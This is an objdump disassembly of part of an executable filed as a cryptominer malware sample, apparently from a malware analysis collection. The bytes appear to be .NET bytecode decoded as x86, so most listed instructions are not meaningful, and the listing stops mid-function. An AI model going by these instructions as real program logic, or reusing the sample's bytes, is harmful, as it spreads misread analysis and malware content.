
malware_samples/miner/eaa844162b4be534e5f046f88434492588c2b85ca01c55a73d892ff7ae2c8e8c.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	80 f6 01             	xor    $0x1,%dh
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 54 a8 01       	add    $0x1a85400,%eax
  402013:	00 e0                	add    %ah,%al
  402015:	4d                   	dec    %ebp
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	41                   	inc    %ecx
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
  402020:	6c                   	insb   (%dx),%es:(%edi)
  402021:	43                   	inc    %ebx
  402022:	00 00                	add    %al,(%eax)
  402024:	e8 64 01 00 00       	call   0x40218d
	...
  40204d:	00 00                	add    %al,(%eax)
  40204f:	00 f2                	add    %dh,%dl
  402051:	1c 8d                	sbb    $0x8d,%al
  402053:	0c 00                	or     $0x0,%al
  402055:	00 01                	add    %al,(%ecx)
  402057:	25 16 72 01 00       	and    $0x17216,%eax
  40205c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40205f:	25 17 72 17 00       	and    $0x177217,%eax
  402064:	00 70 a2             	add    %dh,-0x5e(%eax)
  402067:	25 18 72 4d 00       	and    $0x4d7218,%eax
  40206c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40206f:	25 19 72 71 00       	and    $0x717219,%eax
  402074:	00 70 a2             	add    %dh,-0x5e(%eax)
  402077:	25 1a 72 85 00       	and    $0x85721a,%eax
  40207c:	00 70 a2             	add    %dh,-0x5e(%eax)
  40207f:	25 1b 72 b9 00       	and    $0xb9721b,%eax
  402084:	00 70 a2             	add    %dh,-0x5e(%eax)
  402087:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40208b:	04 2a                	add    $0x2a,%al
  40208d:	92                   	xchg   %eax,%edx
  40208e:	02 28                	add    (%eax),%ch
  402090:	0a 00                	or     (%eax),%al
  402092:	00 0a                	add    %cl,(%edx)
  402094:	02 03                	add    (%ebx),%al
  402096:	7d 05                	jge    0x40209d
  402098:	00 00                	add    %al,(%eax)
  40209a:	04 02                	add    $0x2,%al
  40209c:	04 7d                	add    $0x7d,%al
  40209e:	06                   	push   %es
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	04 02                	add    $0x2,%al
  4020a3:	05 7d 07 00 00       	add    $0x77d,%eax
  4020a8:	04 02                	add    $0x2,%al
  4020aa:	0e                   	push   %cs
  4020ab:	04 7d                	add    $0x7d,%al
  4020ad:	08 00                	or     %al,(%eax)
  4020af:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4020b2:	9a 02 03 16 9a 75 0c 	lcall  $0xc75,$0x9a160302
  4020b9:	00 00                	add    %al,(%eax)
  4020bb:	01 7d 09             	add    %edi,0x9(%ebp)
  4020be:	00 00                	add    %al,(%eax)
  4020c0:	04 02                	add    $0x2,%al
  4020c2:	7b 06                	jnp    0x4020ca
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	04 6f                	add    $0x6f,%al
  4020c8:	0b 00                	or     (%eax),%eax
  4020ca:	00 0a                	add    %cl,(%edx)
  4020cc:	72 db                	jb     0x4020a9
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	70 03                	jo     0x4020d5
  4020d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4020d3:	0c 00                	or     $0x0,%al
  4020d5:	00 0a                	add    %cl,(%edx)
  4020d7:	26 2a 9e 02 19 8d 0b 	sub    %es:0xb8d1902(%esi),%bl
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	01 25 16 72 01 01    	add    %esp,0x1017216
  4020e6:	00 70 a2             	add    %dh,-0x5e(%eax)
  4020e9:	25 17 03 8c 10       	and    $0x108c0317,%eax
  4020ee:	00 00                	add    %al,(%eax)
  4020f0:	01 a2 25 18 04 8c    	add    %esp,-0x73fbe7db(%edx)
  4020f6:	10 00                	adc    %al,(%eax)
  4020f8:	00 01                	add    %al,(%ecx)
  4020fa:	a2 28 0e 00 00       	mov    %al,0xe28
  4020ff:	06                   	push   %es
  402100:	2a 56 02             	sub    0x2(%esi),%dl
  402103:	17                   	pop    %ss
  402104:	8d 0b                	lea    (%ebx),%ecx
  402106:	00 00                	add    %al,(%eax)
  402108:	01 25 16 72 19 01    	add    %esp,0x1197216
  40210e:	00 70 a2             	add    %dh,-0x5e(%eax)
  402111:	28 0e                	sub    %cl,(%esi)
  402113:	00 00                	add    %al,(%eax)
  402115:	06                   	push   %es
  402116:	2a 8a 02 19 8d 0b    	sub    0xb8d1902(%edx),%cl
  40211c:	00 00                	add    %al,(%eax)
  40211e:	01 25 16 72 2f 01    	add    %esp,0x12f7216
  402124:	00 70 a2             	add    %dh,-0x5e(%eax)
  402127:	25 17 03 a2 25       	and    $0x25a20317,%eax
  40212c:	18 02                	sbb    %al,(%edx)
  40212e:	7b 07                	jnp    0x402137
  402130:	00 00                	add    %al,(%eax)
  402132:	04 a2                	add    $0xa2,%al
  402134:	28 0e                	sub    %cl,(%esi)
  402136:	00 00                	add    %al,(%eax)
  402138:	06                   	push   %es
  402139:	2a 00                	sub    (%eax),%al
  40213b:	00 13                	add    %dl,(%ebx)
  40213d:	30 02                	xor    %al,(%edx)
  40213f:	00 33                	add    %dh,(%ebx)
  402141:	00 00                	add    %al,(%eax)
  402143:	00 01                	add    %al,(%ecx)
  402145:	00 00                	add    %al,(%eax)
  402147:	11 12                	adc    %edx,(%edx)
  402149:	00 28                	add    %ch,(%eax)
  40214b:	0e                   	push   %cs
  40214c:	00 00                	add    %al,(%eax)
  40214e:	0a 7d 1c             	or     0x1c(%ebp),%bh
  402151:	00 00                	add    %al,(%eax)
  402153:	04 12                	add    $0x12,%al
  402155:	00 02                	add    %al,(%edx)
  402157:	7d 1d                	jge    0x402176
  402159:	00 00                	add    %al,(%eax)
  40215b:	04 12                	add    $0x12,%al
  40215d:	00 03                	add    %al,(%ebx)
  40215f:	7d 1e                	jge    0x40217f
  402161:	00 00                	add    %al,(%eax)
  402163:	04 12                	add    $0x12,%al
  402165:	00 15 7d 1b 00 00    	add    %dl,0x1b7d
  40216b:	04 12                	add    $0x12,%al
  40216d:	00 7c 1c 00          	add    %bh,0x0(%esp,%ebx,1)
  402171:	00 04 12             	add    %al,(%edx,%edx,1)
  402174:	00 28                	add    %ch,(%eax)
  402176:	01 00                	add    %eax,(%eax)
  402178:	00 2b                	add    %ch,(%ebx)
  40217a:	2a 32                	sub    (%edx),%dh
  40217c:	02 7b 05             	add    0x5(%ebx),%bh
  40217f:	00 00                	add    %al,(%eax)
  402181:	04 6f                	add    $0x6f,%al
  402183:	11 00                	adc    %eax,(%eax)
  402185:	00 0a                	add    %cl,(%edx)
  402187:	2a 36                	sub    (%esi),%dh
  402189:	02 7b 05             	add    0x5(%ebx),%bh
  40218c:	00 00                	add    %al,(%eax)
  40218e:	04 03                	add    $0x3,%al
  402190:	6f                   	outsl  %ds:(%esi),(%dx)
  402191:	2c 00                	sub    $0x0,%al
  402193:	00 06                	add    %al,(%esi)
  402195:	2a 00                	sub    (%eax),%al
  402197:	00 13                	add    %dl,(%ebx)
  402199:	30 03                	xor    %al,(%ebx)
  40219b:	00 31                	add    %dh,(%ecx)
  40219d:	00 00                	add    %al,(%eax)
  40219f:	00 02                	add    %al,(%edx)
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	11 03                	adc    %eax,(%ebx)
  4021a5:	16                   	push   %ss
  4021a6:	6a 31                	push   $0x31
  4021a8:	2b 04 6b             	sub    (%ebx,%ebp,2),%eax
  4021ab:	03 6b 5b             	add    0x5b(%ebx),%ebp
  4021ae:	22 00                	and    (%eax),%al
  4021b0:	00 c8                	add    %cl,%al
  4021b2:	42                   	inc    %edx
  4021b3:	5a                   	pop    %edx
  4021b4:	6c                   	insb   (%dx),%es:(%edi)
  4021b5:	28 12                	sub    %dl,(%edx)
  4021b7:	00 00                	add    %al,(%eax)
  4021b9:	0a 69 0a             	or     0xa(%ecx),%ch
  4021bc:	06                   	push   %es
  4021bd:	02 7b 0a             	add    0xa(%ebx),%bh
  4021c0:	00 00                	add    %al,(%eax)
  4021c2:	04 31                	add    $0x31,%al
  4021c4:	0f 02 06             	lar    (%esi),%eax
  4021c7:	7d 0a                	jge    0x4021d3
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	04 02                	add    $0x2,%al
  4021cd:	04 03                	add    $0x3,%al
  4021cf:	28 0f                	sub    %cl,(%edi)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	06                   	push   %es
  4021d4:	2a 00                	sub    (%eax),%al
  4021d6:	00 00                	add    %al,(%eax)
  4021d8:	13 30                	adc    (%eax),%esi
  4021da:	04 00                	add    $0x0,%al
  4021dc:	92                   	xchg   %eax,%edx
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	00 03                	add    %al,(%ebx)
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	11 1f                	adc    %ebx,(%edi)
  4021e5:	1a 28                	sbb    (%eax),%ch
  4021e7:	13 00                	adc    (%eax),%eax
  4021e9:	00 0a                	add    %cl,(%edx)
  4021eb:	0a 06                	or     (%esi),%al
  4021ed:	72 3d                	jb     0x40222c
  4021ef:	01 00                	add    %eax,(%eax)
  4021f1:	70 28                	jo     0x40221b
  4021f3:	14 00                	adc    $0x0,%al
  4021f5:	00 0a                	add    %cl,(%edx)
  4021f7:	28 15 00 00 0a 2c    	sub    %dl,0x2c0a0000
  4021fd:	01 2a                	add    %ebp,(%edx)
  4021ff:	06                   	push   %es
  402200:	72 49                	jb     0x40224b
  402202:	01 00                	add    %eax,(%eax)
  402204:	70 72                	jo     0x402278
  402206:	53                   	push   %ebx
  402207:	01 00                	add    %eax,(%eax)
  402209:	70 28                	jo     0x402233
  40220b:	16                   	push   %ss
  40220c:	00 00                	add    %al,(%eax)
  40220e:	0a 0b                	or     (%ebx),%cl
  402210:	07                   	pop    %es
  402211:	72 5b                	jb     0x40226e
  402213:	01 00                	add    %eax,(%eax)
  402215:	70 28                	jo     0x40223f
  402217:	14 00                	adc    $0x0,%al
  402219:	00 0a                	add    %cl,(%edx)
  40221b:	0c 08                	or     $0x8,%al
  40221d:	28 17                	sub    %dl,(%edi)
  40221f:	00 00                	add    %al,(%eax)
  402221:	0a 2c 01             	or     (%ecx,%eax,1),%ch
  402224:	2a 07                	sub    (%edi),%al
  402226:	28 15 00 00 0a 2d    	sub    %dl,0x2d0a0000
  40222c:	07                   	pop    %es
  40222d:	07                   	pop    %es
  40222e:	28 18                	sub    %bl,(%eax)
  402230:	00 00                	add    %al,(%eax)
  402232:	0a 26                	or     (%esi),%ah
  402234:	72 6f                	jb     0x4022a5
  402236:	01 00                	add    %eax,(%eax)
  402238:	70 02                	jo     0x40223c
  40223a:	7b 08                	jnp    0x402244
  40223c:	00 00                	add    %al,(%eax)
  40223e:	04 2c                	add    $0x2c,%al
  402240:	17                   	pop    %ss
  402241:	72 b5                	jb     0x4021f8
  402243:	01 00                	add    %eax,(%eax)
  402245:	70 02                	jo     0x402249
  402247:	7b 08                	jnp    0x402251
  402249:	00 00                	add    %al,(%eax)
  40224b:	04 72                	add    $0x72,%al
  40224d:	b5 01                	mov    $0x1,%ch
  40224f:	00 70 28             	add    %dh,0x28(%eax)
  402252:	19 00                	sbb    %eax,(%eax)
  402254:	00 0a                	add    %cl,(%edx)
  402256:	2b 05 72 b9 01 00    	sub    0x1b972,%eax
  40225c:	70 72                	jo     0x4022d0
  40225e:	c3                   	ret
  40225f:	01 00                	add    %eax,(%eax)
  402261:	70 28                	jo     0x40228b
  402263:	19 00                	sbb    %eax,(%eax)
  402265:	00 0a                	add    %cl,(%edx)
  402267:	0d 08 09 16 73       	or     $0x73160908,%eax
  40226c:	1a 00                	sbb    (%eax),%al
  40226e:	00 0a                	add    %cl,(%edx)
  402270:	28 1b                	sub    %bl,(%ebx)
  402272:	00 00                	add    %al,(%eax)
  402274:	0a 2a                	or     (%edx),%ch
  402276:	00 00                	add    %al,(%eax)
  402278:	13 30                	adc    (%eax),%esi
  40227a:	02 00                	add    (%eax),%al
  40227c:	47                   	inc    %edi
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 04 00             	add    %al,(%eax,%eax,1)
  402282:	00 11                	add    %dl,(%ecx)
  402284:	12 00                	adc    (%eax),%al
  402286:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402289:	00 0a                	add    %cl,(%edx)
  40228b:	7d 0c                	jge    0x402299
  40228d:	00 00                	add    %al,(%eax)
  40228f:	04 12                	add    $0x12,%al
  402291:	00 02                	add    %al,(%edx)
  402293:	7d 0f                	jge    0x4022a4
  402295:	00 00                	add    %al,(%eax)
  402297:	04 12                	add    $0x12,%al
  402299:	00 03                	add    %al,(%ebx)
  40229b:	7d 0d                	jge    0x4022aa
  40229d:	00 00                	add    %al,(%eax)
  40229f:	04 12                	add    $0x12,%al
  4022a1:	00 04 7d 0e 00 00 04 	add    %al,0x400000e(,%edi,2)
  4022a8:	12 00                	adc    (%eax),%al
  4022aa:	15 7d 0b 00 00       	adc    $0xb7d,%eax
  4022af:	04 12                	add    $0x12,%al
  4022b1:	00 7c 0c 00          	add    %bh,0x0(%esp,%ecx,1)
  4022b5:	00 04 12             	add    %al,(%edx,%edx,1)
  4022b8:	00 28                	add    %ch,(%eax)
  4022ba:	02 00                	add    (%eax),%al
  4022bc:	00 2b                	add    %ch,(%ebx)
  4022be:	12 00                	adc    (%eax),%al
  4022c0:	7c 0c                	jl     0x4022ce
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	04 28                	add    $0x28,%al
  4022c6:	1e                   	push   %ds
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	0a 2a                	or     (%edx),%ch
  4022cb:	00 1b                	add    %bl,(%ebx)
  4022cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4022d0:	84 03                	test   %al,(%ebx)
  4022d2:	00 00                	add    %al,(%eax)
  4022d4:	05 00 00 11 02       	add    $0x2110000,%eax
  4022d9:	7b 0b                	jnp    0x4022e6
  4022db:	00 00                	add    %al,(%eax)
  4022dd:	04 0a                	add    $0xa,%al
  4022df:	02 7b 0f             	add    0xf(%ebx),%bh
  4022e2:	00 00                	add    %al,(%eax)
  4022e4:	04 0b                	add    $0xb,%al
  4022e6:	06                   	push   %es
  4022e7:	2c 49                	sub    $0x49,%al
  4022e9:	06                   	push   %es
  4022ea:	17                   	pop    %ss
  4022eb:	59                   	pop    %ecx
  4022ec:	18 36                	sbb    %dh,(%esi)
  4022ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4022ef:	73 20                	jae    0x402311
  4022f1:	00 00                	add    %al,(%eax)
  4022f3:	0a 02                	or     (%edx),%al
  4022f5:	7b 0d                	jnp    0x402304
  4022f7:	00 00                	add    %al,(%eax)
  4022f9:	04 17                	add    $0x17,%al
  4022fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4022fc:	21 00                	and    %eax,(%eax)
  4022fe:	00 0a                	add    %cl,(%edx)
  402300:	6f                   	outsl  %ds:(%esi),(%dx)
  402301:	22 00                	and    (%eax),%al
  402303:	00 0a                	add    %cl,(%edx)
  402305:	0d 12 03 28 23       	or     $0x23280312,%eax
  40230a:	00 00                	add    %al,(%eax)
  40230c:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  402312:	0a 7d 0b             	or     0xb(%ebp),%bh
  402315:	00 00                	add    %al,(%eax)
  402317:	04 02                	add    $0x2,%al
  402319:	09 7d 11             	or     %edi,0x11(%ebp)
  40231c:	00 00                	add    %al,(%eax)
  40231e:	04 02                	add    $0x2,%al
  402320:	7c 0c                	jl     0x40232e
  402322:	00 00                	add    %al,(%eax)
  402324:	04 12                	add    $0x12,%al
  402326:	03 02                	add    (%edx),%eax
  402328:	28 03                	sub    %al,(%ebx)
  40232a:	00 00                	add    %al,(%eax)
  40232c:	2b dd                	sub    %ebp,%ebx
  40232e:	29 03                	sub    %eax,(%ebx)
  402330:	00 00                	add    %al,(%eax)
  402332:	02 7b 11             	add    0x11(%ebx),%bh
  402335:	00 00                	add    %al,(%eax)
  402337:	04 0d                	add    $0xd,%al
  402339:	02 7c 11 00          	add    0x0(%ecx,%edx,1),%bh
  40233d:	00 04 fe             	add    %al,(%esi,%edi,8)
  402340:	15 02 00 00 1b       	adc    $0x1b000002,%eax
  402345:	02 15 25 0a 7d 0b    	add    0xb7d0a25,%dl
  40234b:	00 00                	add    %al,(%eax)
  40234d:	04 12                	add    $0x12,%al
  40234f:	03 28                	add    (%eax),%ebp
  402351:	25 00 00 0a 0c       	and    $0xc0a0000,%eax
  402356:	02 08                	add    (%eax),%cl
  402358:	7d 10                	jge    0x40236a
  40235a:	00 00                	add    %al,(%eax)
  40235c:	04 00                	add    $0x0,%al
  40235e:	06                   	push   %es
  40235f:	17                   	pop    %ss
  402360:	59                   	pop    %ecx
  402361:	18 36                	sbb    %dh,(%esi)
  402363:	42                   	inc    %edx
  402364:	02 7b 10             	add    0x10(%ebx),%bh
  402367:	00 00                	add    %al,(%eax)
  402369:	04 6f                	add    $0x6f,%al
  40236b:	26 00 00             	add    %al,%es:(%eax)
  40236e:	0a 26                	or     (%esi),%ah
  402370:	02 02                	add    (%edx),%al
  402372:	7b 10                	jnp    0x402384
  402374:	00 00                	add    %al,(%eax)
  402376:	04 6f                	add    $0x6f,%al
  402378:	27                   	daa
  402379:	00 00                	add    %al,(%eax)
  40237b:	0a 6f 28             	or     0x28(%edi),%ch
  40237e:	00 00                	add    %al,(%eax)
  402380:	0a 6f 29             	or     0x29(%edi),%ch
  402383:	00 00                	add    %al,(%eax)
  402385:	0a 13                	or     (%ebx),%dl
  402387:	04 12                	add    $0x12,%al
  402389:	04 28                	add    $0x28,%al
  40238b:	2a 00                	sub    (%eax),%al
  40238d:	00 0a                	add    %cl,(%edx)
  40238f:	7d 12                	jge    0x4023a3
  402391:	00 00                	add    %al,(%eax)
  402393:	04 02                	add    $0x2,%al
  402395:	02 7b 0e             	add    0xe(%ebx),%bh
  402398:	00 00                	add    %al,(%eax)
  40239a:	04 17                	add    $0x17,%al
  40239c:	73 2b                	jae    0x4023c9
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	0a 7d 13             	or     0x13(%ebp),%bh
  4023a3:	00 00                	add    %al,(%eax)
  4023a5:	04 00                	add    $0x0,%al
  4023a7:	06                   	push   %es
  4023a8:	17                   	pop    %ss
  4023a9:	2e 4a                	cs dec %edx
  4023ab:	06                   	push   %es
  4023ac:	18 59 17             	sbb    %bl,0x17(%ecx)
  4023af:	36 72 02             	ss jb  0x4023b4
  4023b2:	7b 10                	jnp    0x4023c4
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	04 6f                	add    $0x6f,%al
  4023b8:	27                   	daa
  4023b9:	00 00                	add    %al,(%eax)
  4023bb:	0a 6f 2c             	or     0x2c(%edi),%ch
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 6f 2d             	or     0x2d(%edi),%ch
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	0a 13                	or     (%ebx),%dl
  4023c7:	06                   	push   %es
  4023c8:	12 06                	adc    (%esi),%al
  4023ca:	28 2e                	sub    %ch,(%esi)
  4023cc:	00 00                	add    %al,(%eax)
  4023ce:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  4023d4:	0a 7d 0b             	or     0xb(%ebp),%bh
  4023d7:	00 00                	add    %al,(%eax)
  4023d9:	04 02                	add    $0x2,%al
  4023db:	11 06                	adc    %eax,(%esi)
  4023dd:	7d 15                	jge    0x4023f4
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	04 02                	add    $0x2,%al
  4023e3:	7c 0c                	jl     0x4023f1
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	04 12                	add    $0x12,%al
  4023e9:	06                   	push   %es
  4023ea:	02 28                	add    (%eax),%ch
  4023ec:	04 00                	add    $0x0,%al
  4023ee:	00 2b                	add    %ch,(%ebx)
  4023f0:	dd 66 02             	frstor 0x2(%esi)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	02 7b 15             	add    0x15(%ebx),%bh
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	04 13                	add    $0x13,%al
  4023fc:	06                   	push   %es
  4023fd:	02 7c 15 00          	add    0x0(%ebp,%edx,1),%bh
  402401:	00 04 fe             	add    %al,(%esi,%edi,8)
  402404:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  402409:	02 15 25 0a 7d 0b    	add    0xb7d0a25,%dl
  40240f:	00 00                	add    %al,(%eax)
  402411:	04 12                	add    $0x12,%al
  402413:	06                   	push   %es
  402414:	28 2f                	sub    %ch,(%edi)
  402416:	00 00                	add    %al,(%eax)
  402418:	0a 13                	or     (%ebx),%dl
  40241a:	05 02 11 05 7d       	add    $0x7d051102,%eax
  40241f:	14 00                	adc    $0x0,%al
  402421:	00 04 00             	add    %al,(%eax,%eax,1)
  402424:	06                   	push   %es
  402425:	18 3b                	sbb    %bh,(%ebx)
  402427:	9d                   	popf
  402428:	00 00                	add    %al,(%eax)
  40242a:	00 06                	add    %al,(%esi)
  40242c:	19 3b                	sbb    %edi,(%ebx)
  40242e:	2e 01 00             	add    %eax,%cs:(%eax)
  402431:	00 07                	add    %al,(%edi)
  402433:	02 7b 12             	add    0x12(%ebx),%bh
  402436:	00 00                	add    %al,(%eax)
  402438:	04 16                	add    $0x16,%al
  40243a:	6a 28                	push   $0x28
  40243c:	15 00 00 06 02       	adc    $0x2060000,%eax
  402441:	7b 12                	jnp    0x402455
  402443:	00 00                	add    %al,(%eax)
  402445:	04 2c                	add    $0x2c,%al
  402447:	11 02                	adc    %eax,(%edx)
  402449:	7b 13                	jnp    0x40245e
  40244b:	00 00                	add    %al,(%eax)
  40244d:	04 02                	add    $0x2,%al
  40244f:	7b 12                	jnp    0x402463
  402451:	00 00                	add    %al,(%eax)
  402453:	04 6f                	add    $0x6f,%al
  402455:	30 00                	xor    %al,(%eax)
  402457:	00 0a                	add    %cl,(%edx)
  402459:	02 20                	add    (%eax),%ah
  40245b:	00 00                	add    %al,(%eax)
  40245d:	10 00                	adc    %al,(%eax)
  40245f:	8d 2f                	lea    (%edi),%ebp
  402461:	00 00                	add    %al,(%eax)
  402463:	01 7d 16             	add    %edi,0x16(%ebp)
  402466:	00 00                	add    %al,(%eax)
  402468:	04 02                	add    $0x2,%al
  40246a:	16                   	push   %ss
  40246b:	7d 17                	jge    0x402484
  40246d:	00 00                	add    %al,(%eax)
  40246f:	04 02                	add    $0x2,%al
  402471:	16                   	push   %ss
  402472:	7d 18                	jge    0x40248c
  402474:	00 00                	add    %al,(%eax)
  402476:	04 38                	add    $0x38,%al
  402478:	96                   	xchg   %eax,%esi
  402479:	00 00                	add    %al,(%eax)
  40247b:	00 02                	add    %al,(%edx)
  40247d:	7b 13                	jnp    0x402492
  40247f:	00 00                	add    %al,(%eax)
  402481:	04 02                	add    $0x2,%al
  402483:	7b 16                	jnp    0x40249b
  402485:	00 00                	add    %al,(%eax)
  402487:	04 16                	add    $0x16,%al
  402489:	02 7b 17             	add    0x17(%ebx),%bh
  40248c:	00 00                	add    %al,(%eax)
  40248e:	04 6f                	add    $0x6f,%al
  402490:	31 00                	xor    %eax,(%eax)
  402492:	00 0a                	add    %cl,(%edx)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	32 00                	xor    (%eax),%al
  402497:	00 0a                	add    %cl,(%edx)
  402499:	13 07                	adc    (%edi),%eax
  40249b:	12 07                	adc    (%edi),%al
  40249d:	28 33                	sub    %dh,(%ebx)
  40249f:	00 00                	add    %al,(%eax)
  4024a1:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  4024a7:	0a 7d 0b             	or     0xb(%ebp),%bh
  4024aa:	00 00                	add    %al,(%eax)
  4024ac:	04 02                	add    $0x2,%al
  4024ae:	11 07                	adc    %eax,(%edi)
  4024b0:	7d 19                	jge    0x4024cb
  4024b2:	00 00                	add    %al,(%eax)
  4024b4:	04 02                	add    $0x2,%al
  4024b6:	7c 0c                	jl     0x4024c4
  4024b8:	00 00                	add    %al,(%eax)
  4024ba:	04 12                	add    $0x12,%al
  4024bc:	07                   	pop    %es
  4024bd:	02 28                	add    (%eax),%ch
  4024bf:	05 00 00 2b dd       	add    $0xdd2b0000,%eax
  4024c4:	93                   	xchg   %eax,%ebx
  4024c5:	01 00                	add    %eax,(%eax)
  4024c7:	00 02                	add    %al,(%edx)
  4024c9:	7b 19                	jnp    0x4024e4
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 13                	add    $0x13,%al
  4024cf:	07                   	pop    %es
  4024d0:	02 7c 19 00          	add    0x0(%ecx,%ebx,1),%bh
  4024d4:	00 04 fe             	add    %al,(%esi,%edi,8)
  4024d7:	15 26 00 00 01       	adc    $0x1000026,%eax
  4024dc:	02 15 25 0a 7d 0b    	add    0xb7d0a25,%dl
  4024e2:	00 00                	add    %al,(%eax)
  4024e4:	04 12                	add    $0x12,%al
  4024e6:	07                   	pop    %es
  4024e7:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4024ea:	00 0a                	add    %cl,(%edx)
  4024ec:	02 02                	add    (%edx),%al
  4024ee:	7b 18                	jnp    0x402508
  4024f0:	00 00                	add    %al,(%eax)
  4024f2:	04 02                	add    $0x2,%al
  4024f4:	7b 17                	jnp    0x40250d
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	04 58                	add    $0x58,%al
  4024fa:	7d 18                	jge    0x402514
  4024fc:	00 00                	add    %al,(%eax)
  4024fe:	04 07                	add    $0x7,%al
  402500:	02 7b 12             	add    0x12(%ebx),%bh
  402503:	00 00                	add    %al,(%eax)
  402505:	04 02                	add    $0x2,%al
  402507:	7b 18                	jnp    0x402521
  402509:	00 00                	add    %al,(%eax)
  40250b:	04 6a                	add    $0x6a,%al
  40250d:	28 15 00 00 06 02    	sub    %dl,0x2060000
  402513:	7b 14                	jnp    0x402529
  402515:	00 00                	add    %al,(%eax)
  402517:	04 02                	add    $0x2,%al
  402519:	7b 16                	jnp    0x402531
  40251b:	00 00                	add    %al,(%eax)
  40251d:	04 16                	add    $0x16,%al
  40251f:	02 7b 16             	add    0x16(%ebx),%bh
  402522:	00 00                	add    %al,(%eax)
  402524:	04 8e                	add    $0x8e,%al
  402526:	69 6f 35 00 00 0a 6f 	imul   $0x6f0a0000,0x35(%edi),%ebp
  40252d:	36 00 00             	add    %al,%ss:(%eax)
  402530:	0a 13                	or     (%ebx),%dl
  402532:	09 12                	or     %edx,(%edx)
  402534:	09 28                	or     %ebp,(%eax)
  402536:	37                   	aaa
  402537:	00 00                	add    %al,(%eax)
  402539:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  40253f:	0a 7d 0b             	or     0xb(%ebp),%bh
  402542:	00 00                	add    %al,(%eax)
  402544:	04 02                	add    $0x2,%al
  402546:	11 09                	adc    %ecx,(%ecx)
  402548:	7d 1a                	jge    0x402564
  40254a:	00 00                	add    %al,(%eax)
  40254c:	04 02                	add    $0x2,%al
  40254e:	7c 0c                	jl     0x40255c
  402550:	00 00                	add    %al,(%eax)
  402552:	04 12                	add    $0x12,%al
  402554:	09 02                	or     %eax,(%edx)
  402556:	28 06                	sub    %al,(%esi)
  402558:	00 00                	add    %al,(%eax)
  40255a:	2b dd                	sub    %ebp,%ebx
  40255c:	fb                   	sti
  40255d:	00 00                	add    %al,(%eax)
  40255f:	00 02                	add    %al,(%edx)
  402561:	7b 1a                	jnp    0x40257d
  402563:	00 00                	add    %al,(%eax)
  402565:	04 13                	add    $0x13,%al
  402567:	09 02                	or     %eax,(%edx)
  402569:	7c 1a                	jl     0x402585
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 fe                	add    $0xfe,%al
  40256f:	15 07 00 00 1b       	adc    $0x1b000007,%eax
  402574:	02 15 25 0a 7d 0b    	add    0xb7d0a25,%dl
  40257a:	00 00                	add    %al,(%eax)
  40257c:	04 12                	add    $0x12,%al
  40257e:	09 28                	or     %ebp,(%eax)
  402580:	38 00                	cmp    %al,(%eax)
  402582:	00 0a                	add    %cl,(%edx)
  402584:	13 08                	adc    (%eax),%ecx
  402586:	02 11                	add    (%ecx),%dl
  402588:	08 25 13 0a 7d 17    	or     %ah,0x177d0a13
  40258e:	00 00                	add    %al,(%eax)
  402590:	04 11                	add    $0x11,%al
  402592:	0a 16                	or     (%esi),%dl
  402594:	3d e3 fe ff ff       	cmp    $0xfffffee3,%eax
  402599:	02 7b 18             	add    0x18(%ebx),%bh
  40259c:	00 00                	add    %al,(%eax)
  40259e:	04 2c                	add    $0x2c,%al
  4025a0:	17                   	pop    %ss
  4025a1:	02 7b 12             	add    0x12(%ebx),%bh
  4025a4:	00 00                	add    %al,(%eax)
  4025a6:	04 2c                	add    $0x2c,%al
  4025a8:	1a 02                	sbb    (%edx),%al
  4025aa:	7b 18                	jnp    0x4025c4
  4025ac:	00 00                	add    %al,(%eax)
  4025ae:	04 6a                	add    $0x6a,%al
  4025b0:	02 7b 12             	add    0x12(%ebx),%bh
  4025b3:	00 00                	add    %al,(%eax)
  4025b5:	04 2e                	add    $0x2e,%al
  4025b7:	0b 72 c7             	or     -0x39(%edx),%esi
  4025ba:	01 00                	add    %eax,(%eax)
  4025bc:	70 73                	jo     0x402631
  4025be:	39 00                	cmp    %eax,(%eax)
  4025c0:	00 0a                	add    %cl,(%edx)
  4025c2:	7a 02                	jp     0x4025c6
  4025c4:	14 7d                	adc    $0x7d,%al
